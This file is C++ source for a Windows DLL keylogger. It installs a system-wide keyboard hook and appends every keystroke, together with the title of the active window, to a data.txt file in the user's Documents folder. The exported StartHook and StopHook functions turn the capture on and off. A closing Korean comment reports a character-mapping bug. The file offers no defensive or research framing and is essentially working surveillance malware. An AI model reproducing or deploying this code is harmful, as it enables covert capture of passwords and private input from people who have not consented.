#include <windows.h>
#include <WinUser.h>
#include <tchar.h>
#include <fstream>
#include <locale.h>


#pragma data_seg(".shared")

HHOOK g_hHook = NULL;
HINSTANCE g_hInst = NULL;


#pragma data_seg()
#pragma comment(linker, "/section:.shared,RWS")
char filepath[256];

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)
{
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		g_hInst = hinstDLL;
		break;

	case DLL_THREAD_ATTACH:
		break;

	case DLL_PROCESS_DETACH:
		break;

	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}

void GetFilePath()
{
	TCHAR Username[10];
	DWORD UserLen;
	TCHAR tFilePath[256];
	GetUserName(Username, &UserLen);
	wsprintf(tFilePath, TEXT("C:\\Users\\%s\\Documents\\data.txt"), Username);
	WideCharToMultiByte(CP_ACP, 0, tFilePath, 256, filepath, 256, NULL, NULL);

}

LRESULT CALLBACK KeyHook(int code, WPARAM wParam, LPARAM lParam)
{
	static char str = NULL;
	static bool caps = FALSE;
		   bool shift = FALSE;
	static BOOL count = FALSE;
	static HWND oldWindow = NULL;
	static char cWindow[255];
	static bool isFirst = FALSE;
	FILE *f;

	if (!isFirst)
	{
		isFirst = TRUE;
		setlocale(LC_ALL, "Korean");
		GetFilePath();
	}

	

	if (code == HC_ACTION) {

		if (count) {
			count = FALSE;
			return CallNextHookEx(NULL, code, wParam, lParam);
		}

		

		fopen_s(&f, filepath, "a+");

		if (f != NULL)
		{

			HWND newWindow = GetForegroundWindow();
			if (oldWindow == NULL || newWindow != oldWindow) {
				GetWindowTextA(GetForegroundWindow(), cWindow, sizeof(cWindow));
				fputs("\nActive Window: ", f);
				fputs(cWindow, f);
				fputs("\n", f);
				oldWindow = newWindow;
			}
			if (wParam == VK_CAPITAL)
				caps = !caps;
			if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
				shift = TRUE;

			switch (wParam)
			{
			case 0x30: fputs(shift ? ")" : "0", f);break;
			case 0x31: fputs(shift ? "!" : "1", f);break;
			case 0x32: fputs(shift ? "@" : "2", f);break;
			case 0x33: fputs(shift ? "#" : "3", f);break;
			case 0x34: fputs(shift ? "$" : "4", f);break;
			case 0x35: fputs(shift ? "%" : "5", f);break;
			case 0x36: fputs(shift ? "^" : "6", f);break;
			case 0x37: fputs(shift ? "&" : "7", f);break;
			case 0x38: fputs(shift ? "*" : "8", f);break;
			case 0x39: fputs(shift ? "(" : "9", f);break;
				// Numpad keys
			case 0x60: fputs("0", f);break;
			case 0x61: fputs("1", f);break;
			case 0x62: fputs("2", f);break;
			case 0x63: fputs("3", f);break;
			case 0x64: fputs("4", f);break;
			case 0x65: fputs("5", f);break;
			case 0x66: fputs("6", f);break;
			case 0x67: fputs("7", f);break;
			case 0x68: fputs("8", f);break;
			case 0x69: fputs("9", f);break;
				// Character keys
			case 0x41: fputs(caps ? (shift ? "a" : "A") : (shift ? "A" : "a"), f);break;
			case 0x42: fputs(caps ? (shift ? "b" : "B") : (shift ? "B" : "b"), f);break;
			case 0x43: fputs(caps ? (shift ? "c" : "C") : (shift ? "C" : "c"), f);break;
			case 0x44: fputs(caps ? (shift ? "d" : "D") : (shift ? "D" : "d"), f);break;
			case 0x45: fputs(caps ? (shift ? "e" : "E") : (shift ? "E" : "e"), f);break;
			case 0x46: fputs(caps ? (shift ? "f" : "F") : (shift ? "F" : "f"), f);break;
			case 0x47: fputs(caps ? (shift ? "g" : "G") : (shift ? "G" : "g"), f);break;
			case 0x48: fputs(caps ? (shift ? "h" : "H") : (shift ? "H" : "h"), f);break;
			case 0x49: fputs(caps ? (shift ? "i" : "I") : (shift ? "I" : "i"), f);break;
			case 0x4A: fputs(caps ? (shift ? "j" : "J") : (shift ? "J" : "j"), f);break;
			case 0x4B: fputs(caps ? (shift ? "k" : "K") : (shift ? "K" : "k"), f);break;
			case 0x4C: fputs(caps ? (shift ? "l" : "L") : (shift ? "L" : "l"), f);break;
			case 0x4D: fputs(caps ? (shift ? "m" : "M") : (shift ? "M" : "m"), f);break;
			case 0x4E: fputs(caps ? (shift ? "n" : "N") : (shift ? "N" : "n"), f);break;
			case 0x4F: fputs(caps ? (shift ? "o" : "O") : (shift ? "O" : "o"), f);break;
			case 0x50: fputs(caps ? (shift ? "p" : "P") : (shift ? "P" : "p"), f);break;
			case 0x51: fputs(caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q"), f);break;
			case 0x52: fputs(caps ? (shift ? "r" : "R") : (shift ? "R" : "r"), f);break;
			case 0x53: fputs(caps ? (shift ? "s" : "S") : (shift ? "S" : "s"), f);break;
			case 0x54: fputs(caps ? (shift ? "t" : "T") : (shift ? "T" : "t"), f);break;
			case 0x55: fputs(caps ? (shift ? "u" : "U") : (shift ? "U" : "u"), f);break;
			case 0x56: fputs(caps ? (shift ? "v" : "V") : (shift ? "V" : "v"), f);break;
			case 0x57: fputs(caps ? (shift ? "w" : "W") : (shift ? "W" : "w"), f);break;
			case 0x58: fputs(caps ? (shift ? "x" : "X") : (shift ? "X" : "x"), f);break;
			case 0x59: fputs(caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y"), f);break;
			case 0x5A: fputs(caps ? (shift ? "z" : "Z") : (shift ? "Z" : "z"), f);break;
				// Special keys
			case VK_SPACE: fputs(" ", f); break;
			case VK_RETURN: fputs("\n", f); break;
			case VK_TAB: fputs("\t", f); break;
			case VK_ESCAPE: fputs("[ESC]", f); break;
			case VK_LEFT: fputs("[LEFT]", f); break;
			case VK_RIGHT: fputs("[RIGHT]", f); break;
			case VK_UP: fputs("[UP]", f); break;
			case VK_DOWN: fputs("[DOWN]", f); break;
			case VK_END: fputs("[END]", f); break;
			case VK_HOME: fputs("[HOME]", f); break;
			case VK_DELETE: fputs("[DELETE]", f); break;
			case VK_BACK: fputs("[BACKSPACE]", f); break;
			case VK_INSERT: fputs("[INSERT]", f); break;
			case VK_LCONTROL: fputs("[CTRL]", f); break;
			case VK_RCONTROL: fputs("[CTRL]", f); break;
			case VK_LMENU: fputs("[ALT]", f); break;
			case VK_RMENU: fputs("[ALT]", f); break;
			case VK_F1: fputs("[F1]", f);break;
			case VK_F2: fputs("[F2]", f);break;
			case VK_F3: fputs("[F3]", f);break;
			case VK_F4: fputs("[F4]", f);break;
			case VK_F5: fputs("[F5]", f);break;
			case VK_F6: fputs("[F6]", f);break;
			case VK_F7: fputs("[F7]", f);break;
			case VK_F8: fputs("[F8]", f);break;
			case VK_F9: fputs("[F9]", f);break;
			case VK_F10: fputs("[F10]", f);break;
			case VK_F11: fputs("[F11]", f);break;
			case VK_F12: fputs("[F12]", f);break;
				// Shift keys
			case VK_LSHIFT: break; // Do nothing
			case VK_RSHIFT: break; // Do nothing
								   // Symbol keys
			case VK_OEM_1: fputs(shift ? ":" : ";", f);break;
			case VK_OEM_2: fputs(shift ? "?" : "/", f);break;
			case VK_OEM_3: fputs(shift ? "~" : "`", f);break;
			case VK_OEM_4: fputs(shift ? "{" : "[", f);break;
			case VK_OEM_5: fputs(shift ? "|" : "\\", f);break;
			case VK_OEM_6: fputs(shift ? "}" : "]", f);break;
			case VK_OEM_7: fputs(shift ? "\"" : "'", f);break;
			case VK_OEM_PLUS: fputs(shift ? "+" : "=", f);break;
			case VK_OEM_COMMA: fputs(shift ? "<" : ",", f);break;
			case VK_OEM_MINUS: fputs(shift ? +"_" : "-", f);break;
			case VK_OEM_PERIOD: fputs(shift ? ">" : ".", f);break;

			default:
				break;

			}

			count = TRUE;
			fclose(f);

		}



		


		

	}
	return CallNextHookEx(NULL, code, wParam, lParam);

		
}


#ifdef __cplusplus
extern "C" {
#endif

	__declspec(dllexport) BOOL StartHook()
	{
		BOOL ret = FALSE;
		if (!g_hHook)
		{
			g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyHook, g_hInst, 0);
			if (g_hHook)
				ret = TRUE;

		}
		return ret;
	}

	__declspec(dllexport) BOOL StopHook()
	{
		BOOL ret = FALSE;
		if (g_hHook)
		{
			ret = UnhookWindowsHookEx(g_hHook);

			if (ret)
				g_hHook = NULL;
		}
		return ret;
	}

#ifdef __cplusplus
}
#endif


//글자 잘못써지는 버그 존재
//키코드 수정 요함